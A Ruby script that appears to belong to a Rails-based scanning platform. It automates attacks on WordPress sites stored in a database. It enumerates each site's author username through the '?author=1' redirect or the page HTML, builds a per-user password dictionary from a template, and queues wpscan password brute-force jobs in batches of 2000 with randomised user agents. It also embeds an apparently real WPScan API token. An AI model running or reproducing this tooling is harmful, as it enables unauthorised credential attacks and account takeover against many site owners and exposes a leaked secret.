ENV['RAILS_ENV'] = 'production'
require File.expand_path(File.dirname(__FILE__) + "/../config/environment")
require 'rails'
require 'rubygems'
require 'httparty'

def get_username site_url
 author_url = "#{site_url}?author=1"
  response = HTTParty.get(author_url, 
    follow_redirects: false, 
    headers: { 'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
    timeout: 10
  )
  
  username = nil
  # 检查是否有重定向
  if response.headers['location']
    # 从重定向URL中提取用户名
    redirect_url = response.headers['location']
    if redirect_url.match(/\/author\/([^\/\?]+)/)
      username = $1
      puts "Found username from redirect: #{username} for #{site_url}"
    end
  else
    # 检查响应体中的HTML标签
    body = response.body
    if body&.match(/<li class="current item-current-([^"]+)">Author: ([^<]+)<\/li>/)
      username = $1
      puts "Found username from HTML (Author): #{username} for #{site_url}"
    elsif body&.match(/<li class="current item-current-([^"]+)">作者: ([^<]+)<\/li>/)
      username = $1
      puts "Found username from HTML (作者): #{username} for #{site_url}"
    end
  end
  return username
end

def generate_password_dictionary(username)
  
  # 生成密码文件路径
  password_file = File.join("tmp", "password_for_#{username}.txt")
  
  # 读取密码模板
  template_file = File.join(File.dirname(__FILE__), '..', 'files', 'password_template.txt')
  
  # 读取模板并替换用户名占位符
  passwords = File.readlines(template_file).map do |line|
    line.strip.gsub('%username%', username)
  end
  
  # 写入密码文件
  File.open(password_file, 'w') do |file|
    passwords.each { |password| file.puts password }
  end
  return password_file
end

def detect_by_wpscan servers
  
  servers.find_in_batches(batch_size: 2000) do |batch|
    puts "Processing batch of #{batch.size} servers..."
    
    batch.each_with_index do |server, index|
      site_url = "#{server.protocal}://#{server.name}"
      
      # 1. 尝试出对方的author,  例如 http://target.com?author=1 ， 看一下 是否会变成 https://target.com/author/021loan 
      # 是的话，那么 021loan 就是用户名
      # 如果url 没有变化，那么就检测 response body中，是否存在：
      username = get_username site_url

      if username.present? 
        # 2. 生成对应的密码字典  保存为临时密码文件  tmp/password_for_#{username}.txt 
        # 密码模板见 files/password_template.txt
        password_file = generate_password_dictionary(username)
        
        # 3. 执行wpscan , 保存结果到数据库
        command = "wpscan --url #{server.protocal}://#{server.name} --usernames #{username} --passwords #{password_file} --api-token JyrztKLFjKYaAmPX6cUoFX2AWquTqZxaNBtacVPwjUo --random-user-agent --no-update --disable-tls-checks --connect-timeout 5 --request-timeout 5 "
      else
# 3. 执行wpscan , 保存结果到数据库
        command = "wpscan --url #{server.protocal}://#{server.name} --api-token JyrztKLFjKYaAmPX6cUoFX2AWquTqZxaNBtacVPwjUo --random-user-agent --no-update --disable-tls-checks --connect-timeout 5 --request-timeout 5 "                
      end

      RunJob.perform_later command: command, result_column: 'wpscan_result',
        is_detected_by_column: 'is_detected_by_wpscan',
        entity: server
    end
  end
end

detect_by_wpscan Server.where('project_id = ? and ehole_result like "%200%"', ARGV[0])
